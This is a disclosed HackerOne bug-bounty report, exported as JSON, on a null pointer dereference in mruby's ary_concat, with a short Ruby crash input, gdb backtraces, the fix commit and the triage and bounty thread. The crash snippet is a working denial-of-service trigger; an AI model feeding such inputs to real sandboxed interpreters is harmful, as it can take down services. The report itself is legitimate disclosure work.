{"id":214681,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ2ODE=","url":"https://hackerone.com/reports/214681","title":"Null pointer dereference in ary_concat ","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-03-19T15:38:46.502Z","submitted_at":"2017-03-19T15:38:46.502Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dgaletic","url":"/dgaletic","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-15T14:44:57.417Z","bug_reporter_agreed_on_going_public_at":"2017-04-15T14:44:57.376Z","team_member_agreed_on_going_public_at":"2017-04-13T21:30:50.930Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PoC\n===\nThe following demonstrates a crash:\n\n    def f\n    end\n    [][*@a] = f \u0026:s\n    \nDebug info\n==========\nmruby crashes in array.c:260 due to a null pointer dereference.\n\n    256│ ary_concat(mrb_state *mrb, struct RArray *a, struct RArray *a2)\n    257│ {\n    258│   mrb_int len;\n    259│\n    260├\u003e  if (a2-\u003elen \u003e ARY_MAX_SIZE - a-\u003elen) {\n    261│     mrb_raise(mrb, E_ARGUMENT_ERROR, \"array size too big\");\n\n    (gdb) p a \n    $2 = (struct RArray *) 0x0\n    \n    (gdb) bt\n    #0  0x0000000000402eff in ary_concat (mrb=0x6af010, a=0x0, a2=0x6b1290) at /home/user/repos/mruby/src/array.c:260\n    #1  0x0000000000403021 in mrb_ary_concat (mrb=0x6af010, self=..., other=...) at /home/user/repos/mruby/src/array.c:279\n    #2  0x000000000042228a in mrb_vm_exec (mrb=0x6af010, proc=0x6b13b0, pc=0x718c14) at /home/user/repos/mruby/src/vm.c:2288\n    #3  0x000000000041b6d6 in mrb_vm_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/user/repos/mruby/src/vm.c:823\n    #4  0x0000000000423ad8 in mrb_top_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/user/repos/mruby/src/vm.c:2614\n    #5  0x0000000000444ac0 in mrb_load_exec (mrb=0x6af010, p=0x70ce90, c=0x70bae0) at /home/user/repos/mruby/mrbgems/mruby-compiler/core/parse.y:5760\n    #6  0x0000000000444b56 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cad0, c=0x70bae0) at /home/user/repos/mruby/mrbgems/mruby-compiler/core/parse.y:5769\n    #7  0x0000000000402415 in main (argc=2, argv=0x7fffffffdbc8) at /home/user/repos/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227\n\n    \nmruby-engine crashes in vm.c:1210 (`CASE(OP_SEND)`).\n\n    1210├\u003e      m = mrb_method_search_vm(mrb, \u0026c, mid)\n        \n    (gdb) bt\n    #0  mrb_vm_exec (mrb=mrb@entry=0x7ffff2ba74e0, proc=proc@entry=0x7ffff2baec90, pc=0x7ffff2c05f44) at /home/user/repos/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1210\n    #1  0x00007ffff4043392 in mrb_vm_run (mrb=0x7ffff2ba74e0, proc=0x7ffff2baec90, self=..., stack_keep=stack_keep@entry=0) at /home/user/repos/mruby-engine/ext/mruby_engine/mruby\n    /src/vm.c:820\n    #2  0x00007ffff4018b4e in mruby_engine_monitored_eval (data=0x7ffff2ba73e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n    #3  0x00007ffff7bc4184 in start_thread (arg=0x7ffff2ba6700) at pthread_create.c:312\n    #4  0x00007ffff6f3a37d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n\nTest platform\n=============\n* Arch Linux, updated as of today (2017-03-19)\n* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3)\n\nmruby SHA: cea6a16cf41b5268a0ad38d1c6ab3140e375f0f3\nmruby-engine SHA: 09be20e67888b20bebf9b0588bc3cbec7f55325f\n\nThank you,\nDinko Galetic\nDenis Kasak","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":51,"name":"NULL Pointer Dereference"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":169982,"file_name":"poc","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/169/982/aaeace85a320927983aa829749cbaca93f354e50/poc?response-content-disposition=attachment%3B%20filename%3D%22poc%22%3B%20filename%2A%3DUTF-8%27%27poc\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ33OZT5PP%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140500Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDh91HQqgz8mt29LtWDknUFVa4Bu86qeWnq8qOBQ4%2B8YAIhAJicmQmdRKuH%2BFKshKD5HTFqxieLS9bLt%2Bm8ixoUQIW3KoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxjBiCZo4VtYu6s0mkq1wMS3NiFshNMAkLirys6UqWqG8DtyLSnjp2Jjq3FOYZ3z5QPGI3pyApw22mHN9%2FCuJJ7nvZBlTnqVZioeymrRwRkh3Ep2Grp7bfy17tsucRab4%2Fwcov%2FuB%2BH%2FlOKLA0dPOLvtzKyIZukVE4weTfh0vOmJyKq0MNT872S%2BEJQLaNHxuaApYj89CoiKQ8iIYPil%2Fer515Tq61zraK163aXC6Wy%2Bh9wZG9n9nO%2BF1HjHbOKQzNHLtEPDs0LaRFl2yyG012UrzxbWRh3SKf%2BZrF4YZHuHGoHHIILeGK7ULsTEUwPzgUchRw1iPy0mN9FOZAmWbrDJGsit0hVq3pp5X2hPUG4sFE8%2F6L9i0WnB%2B10Vp3U%2Frt684dQjLB%2BN9XMGfru4gI4tqqTswEvdVKIEl24vu1y1GF4NHtB52g2uU0a32AMPT4CyiEmO89SmREN7kkSkG506ZPZM6WpVb3X01QplYYRrO8hlLoLzsG90yPauXyc9z1g3ctobA3rwzP0%2BqnbTFOPOLdg%2Fez87Kn7dOH%2FJ5gT4VcfvDJKUt7spf4PMSNNs%2B45MGrcVDhtPaqpVkGpjTY2Qumd8jnWYmah%2BcSUkcSfYxIQ8VjPNpkeGcsLaLhPLK%2BhKhc6iXUw9vqQiwY6pAEkpudJjvKBj1n%2B2NK2uzTbiu0zjrqvjRC7B2s5rDWkChSlyjdb5Gs7Y4xGynRFg2owPJvc66mub6OLgiEzz%2BMOYFcjvSwIHpDD0Esy3kPtVCPpCMvheYuZFtLkLN%2FOortUj7F7jaVVdakEud32Wsg33glLfI0B%2F55RSf0DkRble%2FhL0EB4lzVO1F1OLS0MQQYssZKljr4UYXvI8G5j0rwW6dHIGQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8dabba3749405b9729e7f45d832847c4d07df8ad251fb9ee6489f5d253541990","file_size":26,"type":"text/plain"}],"allow_singular_disclosure_at":"2017-05-13T21:30:50.957Z","allow_singular_disclosure_after":-139250049.39630282,"singular_disclosure_allowed":true,"vote_count":7,"voters":["dgaletic","michiel","eveeez","linkks","spetr0x","fathy","adiet7579"],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1550876,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to two weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-03-19T15:38:46.745Z","updated_at":"2017-03-19T15:38:46.745Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1555226,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Thank you for your report.\n\nThis appears to cause the same crash as another issue that was previously submitted to us (https://github.com/mruby/mruby/issues/3532) so I'm going to close this as a duplicate for now and double check once the root cause of that crash is determined.","automated_response":false,"created_at":"2017-03-21T18:02:44.066Z","updated_at":"2017-03-21T18:02:44.066Z","original_report_id":214171,"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1580640,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"I'm re-opening this issue, because it appears it was fixed by https://github.com/mruby/mruby/commit/071164b7999d0932fd60fb3c580a6c374ab1cf4f and was thus not a duplicate of https://github.com/mruby/mruby/issues/3532.","automated_response":false,"created_at":"2017-04-03T15:18:53.070Z","updated_at":"2017-04-03T15:18:53.070Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1580666,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"As noted above, this issue was addressed in https://github.com/mruby/mruby/commit/071164b7999d0932fd60fb3c580a6c374ab1cf4f.\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-04-03T15:30:29.564Z","updated_at":"2017-04-03T15:30:29.564Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dgaletic","url":"/dgaletic"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1606077,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify and the MRuby project!","automated_response":false,"created_at":"2017-04-11T22:39:57.883Z","updated_at":"2017-04-11T22:39:57.883Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"dgaletic","url":"/dgaletic"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1610627,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-04-13T21:30:50.943Z","updated_at":"2017-04-13T21:30:50.943Z","first_to_agree":true,"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1613186,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-04-15T14:44:57.390Z","updated_at":"2017-04-15T14:44:57.390Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1613187,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-04-15T14:44:57.432Z","updated_at":"2017-04-15T14:44:57.432Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}